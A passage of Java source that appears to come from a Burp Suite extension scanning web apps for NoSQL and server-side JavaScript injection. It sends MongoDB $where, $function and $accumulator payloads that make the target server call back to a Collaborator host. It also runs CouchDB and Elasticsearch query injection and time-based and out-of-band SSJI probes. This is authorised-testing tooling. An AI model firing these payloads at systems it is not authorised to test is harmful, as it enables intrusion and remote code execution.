        for (String[] tmpl : oobTemplates) {
            String payloadTemplate = tmpl[0];
            String technique = tmpl[1];

            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "nosqli-scanner", url, target.name,
                    "NoSQLi OOB " + technique,
                    interaction -> {
                        findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                        "NoSQL Injection Confirmed (Out-of-Band) - MongoDB $where",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(target.name)
                                .evidence("Technique: " + technique
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("Blind NoSQL injection confirmed via Burp Collaborator. "
                                        + "The MongoDB $where operator executed JavaScript that triggered "
                                        + "an outbound " + interaction.type().name() + " callback. "
                                        + "This confirms server-side JavaScript execution within MongoDB queries. "
                                        + "Remediation: Disable $where operator usage, use parameterized queries, "
                                        + "and validate/sanitize all user input before use in database queries.")
                                .requestResponse(sentRequest.get())
                                .build());
                        api.logging().logToOutput("[NoSQLi OOB] Confirmed! " + technique
                                + " at " + url + " param=" + target.name);
                    }
            );

            if (collabPayload == null) continue;

            String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);

            if (target.type == TargetType.JSON) {
                // For JSON targets, inject via $where in the JSON body
                String body = original.request().bodyToString();
                String wherePayload = "{\"$where\": \"" + payload.replace("\"", "\\\"") + "\"}";
                String newBody = injectWhereIntoJsonBody(body, wherePayload);
                if (newBody != null && !newBody.equals(body)) {
                    HttpRequest modified = original.request().withBody(newBody);
                    try {
                        HttpRequestResponse result = api.http().sendRequest(modified);
                        sentRequest.set(result);
                    } catch (Exception ignored) {}
                }
            } else {
                // For query/body/cookie params, inject as [$where] operator param
                HttpRequest modified = injectOperatorParam(original.request(), target, "[$where]", payload);
                if (modified != null) {
                    try {
                        HttpRequestResponse result = api.http().sendRequest(modified);
                        sentRequest.set(result);
                    } catch (Exception ignored) {}
                }
            }

            perHostDelay();
        }

        // MongoDB $function OOB payload (MongoDB 4.4+) — only for JSON body targets
        if (target.type == TargetType.JSON) {
            AtomicReference<HttpRequestResponse> sentFuncRequest = new AtomicReference<>();
            String collabFuncPayload = collaboratorManager.generatePayload(
                    "nosqli-scanner", url, target.name,
                    "NoSQLi OOB $function java.net.URL callback",
                    interaction -> {
                        findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                        "NoSQL Injection Confirmed (Out-of-Band) - MongoDB $function",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(target.name)
                                .evidence("Technique: $function java.net.URL OOB"
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("Blind NoSQL injection confirmed via Burp Collaborator using "
                                        + "MongoDB $function operator (4.4+). The server executed arbitrary "
                                        + "JavaScript via $function and triggered an outbound callback. "
                                        + "Remediation: Disable $function usage, use parameterized queries.")
                                .requestResponse(sentFuncRequest.get())
                                .build());
                        api.logging().logToOutput("[NoSQLi OOB] Confirmed! $function at " + url
                                + " param=" + target.name);
                    }
            );

            if (collabFuncPayload != null) {
                String body = original.request().bodyToString();
                // Inject $function as a top-level aggregation expression in the JSON body
                String funcPayload = "{\"$function\": {\"body\": \"function() { var url = new java.net.URL('http://"
                        + collabFuncPayload + "'); url.openConnection().getInputStream(); return true; }\", "
                        + "\"args\": [], \"lang\": \"js\"}}";
                // Replace the target value with the $function expression
                String pattern = "\"" + Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + target.name + "\": " + funcPayload;
                String newBody = body.replaceFirst(pattern, replacement);
                if (!newBody.equals(body)) {
                    HttpRequest modified = original.request().withBody(newBody);
                    try {
                        HttpRequestResponse funcResult = api.http().sendRequest(modified);
                        sentFuncRequest.set(funcResult);
                    } catch (Exception ignored) {}
                }
                perHostDelay();
            }

            // MongoDB $accumulator OOB payload (MongoDB 4.4+)
            AtomicReference<HttpRequestResponse> sentAccumRequest = new AtomicReference<>();
            String collabAccumPayload = collaboratorManager.generatePayload(
                    "nosqli-scanner", url, target.name,
                    "NoSQLi OOB $accumulator init DNS callback",
                    interaction -> {
                        findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                        "NoSQL Injection Confirmed (Out-of-Band) - MongoDB $accumulator",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(target.name)
                                .evidence("Technique: $accumulator init DNS callback"
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("Blind NoSQL injection confirmed via Burp Collaborator using "
                                        + "MongoDB $accumulator operator (4.4+). The init function executed "
                                        + "arbitrary JavaScript that triggered an outbound DNS callback. "
                                        + "Remediation: Disable $accumulator usage, use parameterized queries.")
                                .requestResponse(sentAccumRequest.get())
                                .build());
                        api.logging().logToOutput("[NoSQLi OOB] Confirmed! $accumulator at " + url
                                + " param=" + target.name);
                    }
            );

            if (collabAccumPayload != null) {
                String body = original.request().bodyToString();
                String accumPayload = "{\"$accumulator\": {\"init\": \"function() { var url = new java.net.URL('http://"
                        + collabAccumPayload + "'); url.openConnection().getInputStream(); return []; }\", "
                        + "\"accumulate\": \"function(state, val) { return state; }\", "
                        + "\"accumulateArgs\": [\"$_id\"], "
                        + "\"merge\": \"function(s1, s2) { return s1; }\", "
                        + "\"lang\": \"js\"}}";
                String pattern = "\"" + Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + target.name + "\": " + accumPayload;
                String newBody = body.replaceFirst(pattern, replacement);
                if (!newBody.equals(body)) {
                    HttpRequest modified = original.request().withBody(newBody);
                    try {
                        HttpRequestResponse accumResult = api.http().sendRequest(modified);
                        sentAccumRequest.set(accumResult);
                    } catch (Exception ignored) {}
                }
                perHostDelay();
            }
        }
    }

    // ==================== PHASE 7: MULTI-DB INJECTION ====================

    /**
     * Tests for NoSQL injection specific to CouchDB and Elasticsearch.
     * Only applies to JSON body targets since these databases use JSON-based queries.
     */
    private void testMultiDbInjection(HttpRequestResponse original, NoSqlTarget target,
                                       int baselineStatus, String baselineBody, int baselineLength) {
        String url = original.request().url();

        // CouchDB Mango query injection
        testCouchDbInjection(original, target, url, baselineStatus, baselineBody, baselineLength);

        // Elasticsearch query injection
        testElasticsearchInjection(original, target, url, baselineStatus, baselineBody, baselineLength);
    }

    private void testCouchDbInjection(HttpRequestResponse original, NoSqlTarget target, String url,
                                       int baselineStatus, String baselineBody, int baselineLength) {
        for (String payload : COUCHDB_JSON_PAYLOADS) {
            try {
                // Replace the entire JSON body with the CouchDB payload
                HttpRequest modified = original.request().withBody(payload);
                HttpRequestResponse result = api.http().sendRequest(modified);
                if (result == null || result.response() == null) continue;

                int resultStatus = result.response().statusCode();
                String resultBody = result.response().bodyToString();
                int resultLength = resultBody.length();

                // Check for CouchDB-specific response patterns
                boolean couchDbResponse = resultBody.contains("\"docs\"")
                        || resultBody.contains("\"rows\"")
                        || resultBody.contains("\"total_rows\"")
                        || resultBody.contains("\"id\"");

                // Also check for significant response change
                boolean significantChange = resultStatus != baselineStatus
                        || (baselineLength > 0 && Math.abs(resultLength - baselineLength) / (double) baselineLength > 0.30);

                if (couchDbResponse && significantChange) {
                    findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                    "NoSQL Injection (CouchDB Mango Query)",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .parameter(target.name)
                            .evidence("Payload: " + payload
                                    + " | Baseline: status=" + baselineStatus + ", len=" + baselineLength
                                    + " | Injected: status=" + resultStatus + ", len=" + resultLength
                                    + " | CouchDB markers found in response")
                            .description("CouchDB Mango query injection detected. The injected"
                                    + " selector query returned database documents.")
                            .requestResponse(result)
                            .build());
                    return;
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi CouchDB test error: " + e.getMessage());
            }
        }
    }

    private void testElasticsearchInjection(HttpRequestResponse original, NoSqlTarget target, String url,
                                              int baselineStatus, String baselineBody, int baselineLength) {
        for (String payload : ELASTICSEARCH_JSON_PAYLOADS) {
            try {
                HttpRequest modified = original.request().withBody(payload);
                HttpRequestResponse result = api.http().sendRequest(modified);
                if (result == null || result.response() == null) continue;

                int resultStatus = result.response().statusCode();
                String resultBody = result.response().bodyToString();
                int resultLength = resultBody.length();

                // Check for Elasticsearch-specific response patterns
                boolean esResponse = resultBody.contains("\"hits\"")
                        || resultBody.contains("\"_source\"")
                        || resultBody.contains("\"_index\"")
                        || resultBody.contains("\"_score\"");

                boolean significantChange = resultStatus != baselineStatus
                        || (baselineLength > 0 && Math.abs(resultLength - baselineLength) / (double) baselineLength > 0.30);

                if (esResponse && significantChange) {
                    findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                    "NoSQL Injection (Elasticsearch Query)",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .parameter(target.name)
                            .evidence("Payload: " + payload
                                    + " | Baseline: status=" + baselineStatus + ", len=" + baselineLength
                                    + " | Injected: status=" + resultStatus + ", len=" + resultLength
                                    + " | Elasticsearch markers found in response")
                            .description("Elasticsearch query injection detected. The injected"
                                    + " query returned search results from the database.")
                            .requestResponse(result)
                            .build());
                    return;
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi Elasticsearch test error: " + e.getMessage());
            }
        }
    }

    // ==================== PHASE 8: SSJI (Server-Side JavaScript Injection) ====================

    /**
     * Tests for Server-Side JavaScript Injection (SSJI) at the application layer.
     * Unlike $where injection (which targets MongoDB), SSJI targets Node.js backends
     * that pass user input to eval(), Function(), vm.runInNewContext(), or similar.
     *
     * Sub-phases:
     *   8a - Expression evaluation (inject arithmetic, check if result appears)
     *   8b - Node.js output detection (process.version, os.hostname, etc.)
     *   8c - Time-based SSJI (execSync sleep, busy-wait loop)
     *   8d - OOB SSJI via Collaborator (child_process, dns, http callbacks)
     */
    private void testSsji(HttpRequestResponse original, NoSqlTarget target,
                           String baselineBody, int baselineLength) {
        String url = original.request().url();

        try {
            // Phase 8a: Expression evaluation detection
            testSsjiExpressions(original, target, url, baselineBody);

            // Phase 8b: Node.js-specific output detection
            testSsjiOutputProbes(original, target, url, baselineBody);

            // Phase 8c: Time-based SSJI
            TimedResult baselineTimed = measureResponseTime(original, target, target.originalValue);
            testSsjiTimeBased(original, target, url, baselineTimed.elapsedMs);

            // Phase 8d: OOB SSJI via Collaborator
            if (collaboratorManager != null && collaboratorManager.isAvailable()) {
                testSsjiOob(original, target, url);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            api.logging().logToError("SSJI test error for " + target.name + ": " + e.getMessage());
        }
    }

    /**
     * Phase 8a: Inject arithmetic/string expressions and check if the evaluated
     * result appears in the response body (but was absent from baseline).
     */
    private void testSsjiExpressions(HttpRequestResponse original, NoSqlTarget target,
                                      String url, String baselineBody) throws InterruptedException {
        for (String[] probe : SSJI_EXPRESSION_PROBES) {
            String payload = probe[0];
            String expectedResult = probe[1];
            String description = probe[2];

            try {
                HttpRequestResponse result = sendWithPayload(original, target, payload);
                if (result == null || result.response() == null) continue;

                String responseBody = result.response().bodyToString();

                // Check if expected result appears in response but not in baseline
                if (responseBody.contains(expectedResult) && !baselineBody.contains(expectedResult)) {
                    findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                    "Server-Side JavaScript Injection (SSJI) - Expression Evaluation",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .parameter(target.name)
                            .evidence("Payload: " + payload + " | Expected result '" + expectedResult
                                    + "' found in response | Technique: " + description)
                            .description("Server-side JavaScript injection detected. The expression '"
                                    + payload + "' was evaluated and produced '" + expectedResult
                                    + "' in the response. This indicates the application passes user input"
                                    + " to eval(), Function(), or a similar JavaScript execution context.")
                            .requestResponse(result)
                            .build());
                    return; // Found SSJI, no need for more expression probes
                }

                perHostDelay();
            } catch (InterruptedException e) {
                throw e;
            } catch (Exception e) {
                api.logging().logToError("SSJI expression test error: " + e.getMessage());
            }
        }
    }

    /**
     * Phase 8b: Inject Node.js-specific payloads and check if the output
     * matches expected patterns (process.version, os.hostname, etc.).
     */
    private void testSsjiOutputProbes(HttpRequestResponse original, NoSqlTarget target,
                                       String url, String baselineBody) throws InterruptedException {
        for (String[] probe : SSJI_OUTPUT_PROBES) {
            String payload = probe[0];
            String responsePattern = probe[1];
            String description = probe[2];

            try {
                HttpRequestResponse result = sendWithPayload(original, target, payload);
                if (result == null || result.response() == null) continue;

                String responseBody = result.response().bodyToString();

                // Check if the response differs from baseline and contains the expected pattern
                Pattern p = Pattern.compile(responsePattern);
                Matcher m = p.matcher(responseBody);
                boolean baselineHasPattern = p.matcher(baselineBody).find();

                if (m.find() && !baselineHasPattern
                        && Math.abs(responseBody.length() - baselineBody.length()) > 2) {
                    findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                    "Server-Side JavaScript Injection (SSJI) - " + description,
                                    Severity.CRITICAL, Confidence.FIRM)
                            .url(url)
                            .parameter(target.name)
                            .evidence("Payload: " + payload + " | Response matched pattern: "
                                    + responsePattern + " | Match: " + m.group())
                            .description("Server-side JavaScript injection confirmed. The payload '"
                                    + payload + "' executed on the server and leaked internal information ("
                                    + description + "). This indicates direct code execution via eval() or similar.")
                            .requestResponse(result)
                            .build());
                    return;
                }

                perHostDelay();
            } catch (InterruptedException e) {
                throw e;
            } catch (Exception e) {
                api.logging().logToError("SSJI output probe error: " + e.getMessage());
            }
        }
    }

    /**
     * Phase 8c: Time-based SSJI detection using Node.js sleep mechanisms.
     * Uses double-tap confirmation to avoid false positives.
     */
    private void testSsjiTimeBased(HttpRequestResponse original, NoSqlTarget target,
                                    String url, long baselineMs) throws InterruptedException {
        int threshold = config.getInt("nosqli.time.threshold", 4000);

        // Try both Unix and Windows payloads
        String[][] allPayloads = {
                SSJI_TIME_PAYLOADS_UNIX,
                SSJI_TIME_PAYLOADS_WINDOWS
        };
        String[] osTypes = {"Unix", "Windows"};

        for (int os = 0; os < allPayloads.length; os++) {
            for (String payload : allPayloads[os]) {
                try {
                    // First attempt
                    TimedResult timed1 = measureResponseTime(original, target, payload);
                    if (timed1.response == null) continue;

                    if (timed1.elapsedMs > threshold && timed1.elapsedMs > baselineMs * 3) {
                        // Double-tap confirmation
                        perHostDelay();
                        TimedResult timed2 = measureResponseTime(original, target, payload);
                        if (timed2.response == null) continue;

                        if (timed2.elapsedMs > threshold && timed2.elapsedMs > baselineMs * 3) {
                            findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                            "Server-Side JavaScript Injection (SSJI) - Time-Based",
                                            Severity.CRITICAL, Confidence.CERTAIN)
                                    .url(url)
                                    .parameter(target.name)
                                    .evidence("Payload: " + payload
                                            + " | Baseline: " + baselineMs + "ms"
                                            + " | Attempt 1: " + timed1.elapsedMs + "ms"
                                            + " | Attempt 2: " + timed2.elapsedMs + "ms"
                                            + " | OS: " + osTypes[os])
                                    .description("Time-based server-side JavaScript injection confirmed."
                                            + " The payload '" + payload + "' caused a consistent delay"
                                            + " exceeding " + threshold + "ms on two consecutive attempts."
                                            + " This proves the server is executing user-supplied JavaScript"
                                            + " via eval(), Function(), or a similar mechanism.")
                                    .requestResponse(timed2.response)
                                    .build());
                            return;
                        }
                    }

                    perHostDelay();
                } catch (InterruptedException e) {
                    throw e;
                } catch (Exception e) {
                    api.logging().logToError("SSJI time-based test error: " + e.getMessage());
                }
            }
        }
    }

    /**
     * Phase 8d: OOB SSJI via Collaborator — direct JavaScript execution payloads
     * without the $where wrapper (targets app-level eval/Function/vm, not MongoDB).
     */
    private void testSsjiOob(HttpRequestResponse original, NoSqlTarget target,
                              String url) throws InterruptedException {
        for (String[] payloadInfo : SSJI_OOB_PAYLOADS) {
            String payloadTemplate = payloadInfo[0];
            String technique = payloadInfo[1];

            try {
                AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();

                String collabPayload = collaboratorManager.generatePayload(
                        "nosqli-scanner", url, target.name,
                        "SSJI OOB " + technique,
                        interaction -> {
                            findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                            "Server-Side JavaScript Injection (SSJI) Confirmed (Out-of-Band)",
                                            Severity.CRITICAL, Confidence.CERTAIN)
                                    .url(url)
                                    .parameter(target.name)
                                    .evidence("Collaborator " + interaction.type().name()
                                            + " interaction received from " + interaction.clientIp()
                                            + " at " + interaction.timeStamp()
                                            + " | Technique: " + technique)
                                    .description("Server-side JavaScript injection confirmed via Collaborator OOB callback."
                                            + " The payload triggered a " + interaction.type().name()
                                            + " request to the Collaborator server, proving the application"
                                            + " executes user-supplied JavaScript (eval/Function/vm)."
                                            + " Technique: " + technique)
                                    .requestResponse(sentRequest.get())
                                    .build());
                            api.logging().logToOutput("[SSJI OOB] Confirmed! " + interaction.type()
                                    + " interaction for " + url + " param=" + target.name
                                    + " technique=" + technique);
                        }
                );

                if (collabPayload == null) continue;

                String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);
                sentRequest.set(sendWithPayload(original, target, payload));

                api.logging().logToOutput("[SSJI OOB] Sent " + technique + " payload to " + url
                        + " param=" + target.name);

                perHostDelay();
            } catch (InterruptedException e) {
                throw e;
            } catch (Exception e) {
                api.logging().logToError("SSJI OOB error: " + e.getMessage());
            }
        }
    }

    // ==================== HELPER METHODS ====================

    /**
     * Sends a request with the payload injected into the target parameter.
     * For QUERY/BODY/COOKIE types, replaces the parameter value directly.
     * For JSON type, replaces the JSON value using regex.
     */
    private HttpRequestResponse sendWithPayload(HttpRequestResponse original, NoSqlTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            api.logging().logToError("NoSQLi failed to send request: " + e.getMessage());
            return null;
        }
    }

    /**
     * Injects a payload as the value of a target parameter.
     * Standard value replacement (not operator injection).
     */
    private HttpRequest injectPayload(HttpRequest request, NoSqlTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case COOKIE:
                return request.withUpdatedParameters(
                        HttpParameter.cookieParameter(target.name, payload));
            case JSON:
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                String jsonPattern = "\"" + Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
                String newBody = body.replaceFirst(jsonPattern, replacement);
                return request.withBody(newBody);
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    /**
     * Injects a MongoDB operator into a URL/Body parameter.
     * Creates a new parameter with the operator suffix appended to the parameter name.
     * e.g., target.name = "username", operatorSuffix = "[$ne]", value = ""
     *       produces: username[$ne]=
     *
     * The original parameter is removed to prevent conflicts.
     */
    private HttpRequest injectOperatorParam(HttpRequest request, NoSqlTarget target,
                                             String operatorSuffix, String value) {
        try {
            String operatorParamName = target.name + operatorSuffix;
            String encodedValue = URLEncoder.encode(value, StandardCharsets.UTF_8);
            switch (target.type) {
                case QUERY:
                    // Remove original param, add operator param
                    return request.withRemovedParameters(
                                    HttpParameter.urlParameter(target.name, target.originalValue))
                            .withAddedParameters(
                                    HttpParameter.urlParameter(operatorParamName, encodedValue));
                case BODY:
                    return request.withRemovedParameters(
                                    HttpParameter.bodyParameter(target.name, target.originalValue))
                            .withAddedParameters(
                                    HttpParameter.bodyParameter(operatorParamName, encodedValue));
                case COOKIE:
                    return request.withRemovedParameters(
                                    HttpParameter.cookieParameter(target.name, target.originalValue))
                            .withAddedParameters(
                                    HttpParameter.cookieParameter(operatorParamName, value));
                default:
                    return null;
            }
        } catch (Exception e) {
            api.logging().logToError("NoSQLi operator param injection error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Replaces a JSON string value with a MongoDB operator object.
     * e.g., "username": "admin" -> "username": {"$ne": ""}
     *
     * Uses regex to locate the key-value pair and replace the value portion.
     */
    private String replaceJsonValueWithOperator(String body, String key, String operator, String operatorValue) {
        try {
            // Match the key and its value (string, number, boolean, or null)
            String pattern = "(\"" + Pattern.quote(key) + "\"\\s*:\\s*)(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
            String replacement = "$1{\"" + operator + "\": " + operatorValue + "}";
            String result = body.replaceFirst(pattern, replacement);
            return result;
        } catch (Exception e) {
            api.logging().logToError("NoSQLi JSON operator replacement error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Injects a $where clause into a JSON body.
     * Parses the payload to extract the $where value and adds it as a top-level key.
     * If the body already has a $where key, it is replaced.
     */
    private String injectWhereIntoJsonBody(String body, String wherePayload) {
        try {
            if (body == null || body.isBlank()) return null;

            // Extract the $where value from the payload
            // Payload format: {"$where": "sleep(5000)"} or {"$where": "function(){...}"}
            Pattern p = Pattern.compile("\"\\$where\"\\s*:\\s*(.+?)\\s*\\}");
            Matcher m = p.matcher(wherePayload);
            if (!m.find()) return null;
            String whereValue = m.group(1);

            // Check if body already contains $where — replace it
            if (body.contains("\"$where\"")) {
                String replacePattern = "\"\\$where\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                return body.replaceFirst(replacePattern, "\"$where\": " + whereValue);
            }

            // Add $where as a new top-level key
            // Insert just after the opening {
            int braceIdx = body.indexOf('{');
            if (braceIdx < 0) return null;

            String afterBrace = body.substring(braceIdx + 1).trim();
            if (afterBrace.isEmpty() || afterBrace.equals("}")) {
                // Empty object: just add the key
                return body.substring(0, braceIdx + 1) + "\"$where\": " + whereValue + "}";
            } else {
                // Non-empty object: add with comma separator
                return body.substring(0, braceIdx + 1)
                        + "\"$where\": " + whereValue + ", "
                        + body.substring(braceIdx + 1);
            }
        } catch (Exception e) {
            api.logging().logToError("NoSQLi $where JSON injection error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Encapsulates the result of a timed request: elapsed time and the response.
     * Eliminates the race condition from using a volatile field for lastTimedResponse.
     */
    private static class TimedResult {
        final long elapsedMs;
        final HttpRequestResponse response;

        TimedResult(long elapsedMs, HttpRequestResponse response) {
            this.elapsedMs = elapsedMs;
            this.response = response;
        }
    }

    private TimedResult measureResponseTime(HttpRequestResponse original, NoSqlTarget target, String payload) {
        long start = System.currentTimeMillis();
        HttpRequestResponse resp = sendWithPayload(original, target, payload);
        long elapsed = System.currentTimeMillis() - start;
        return new TimedResult(elapsed, resp);
    }

    /**
     * Measures response time for a pre-built HttpRequest (used by time-based tests
     * where the request is constructed differently, e.g., operator param injection).
     */
    private TimedResult measureResponseTimeForRequest(HttpRequest request) {
        try {
            long start = System.currentTimeMillis();
            HttpRequestResponse resp = api.http().sendRequest(request);
            long elapsed = System.currentTimeMillis() - start;
            return new TimedResult(elapsed, resp);
        } catch (Exception e) {
            api.logging().logToError("NoSQLi response time measurement error: " + e.getMessage());
            return new TimedResult(0, null);
        }
    }

    // ==================== TARGET EXTRACTION ====================

    /**
     * Extracts all injectable targets from the request:
     * - URL query parameters
     * - Body parameters (form-encoded)
     * - Cookie values
     * - JSON body keys/values (parsed with Gson)
     */
    private List<NoSqlTarget> extractTargets(HttpRequest request) {
        List<NoSqlTarget> targets = new ArrayList<>();

        // Standard parameters (URL, body, cookie)
        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new NoSqlTarget(param.name(), param.value(), TargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new NoSqlTarget(param.name(), param.value(), TargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new NoSqlTarget(param.name(), param.value(), TargetType.COOKIE));
                    break;
            }
        }

        // Header injection targets
        String[] headerTargets = {"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host"};
        for (String headerName : headerTargets) {
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    targets.add(new NoSqlTarget(headerName, h.value(), TargetType.HEADER));
                    break;
                }
            }
        }

        // JSON body parameters
        String contentType = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) {
                contentType = h.value();
                break;
            }
        }
        if (contentType.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null && !body.isBlank()) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonParams(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {
                // Malformed JSON — skip JSON target extraction
            }
        }

        return targets;
    }

    /**
     * Recursively extracts JSON key-value pairs as injection targets.
     * Only extracts leaf-level primitive string values and numeric values.
     */
    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<NoSqlTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive()) {
                if (val.getAsJsonPrimitive().isString()) {
                    targets.add(new NoSqlTarget(fullKey, val.getAsString(), TargetType.JSON));
                } else if (val.getAsJsonPrimitive().isNumber()) {
                    targets.add(new NoSqlTarget(fullKey, val.getAsString(), TargetType.JSON));
                }
            } else if (val.isJsonObject()) {
                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    /**
     * Extracts the path portion of a URL for deduplication.
     */
    private String extractPath(String url) {
        try {
            if (url.contains("://")) {
                url = url.substring(url.indexOf("://") + 3);
            }
            int slashIdx = url.indexOf('/');
            if (slashIdx >= 0) {
                int queryIdx = url.indexOf('?', slashIdx);
                return queryIdx >= 0 ? url.substring(slashIdx, queryIdx) : url.substring(slashIdx);
            }
        } catch (Exception ignored) {
        }
        return url;
    }

    /**
     * Per-host delay between requests to avoid overwhelming the target.
     */
    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("nosqli.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() {
        tested.clear();
    }

    // ==================== INNER TYPES ====================

    private enum TargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class NoSqlTarget {
        final String name;
        final String originalValue;
        final TargetType type;

        NoSqlTarget(String name, String originalValue, TargetType type) {
            this.name = name;
            this.originalValue = originalValue != null ? originalValue : "";
            this.type = type;
        }
    }

    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
}
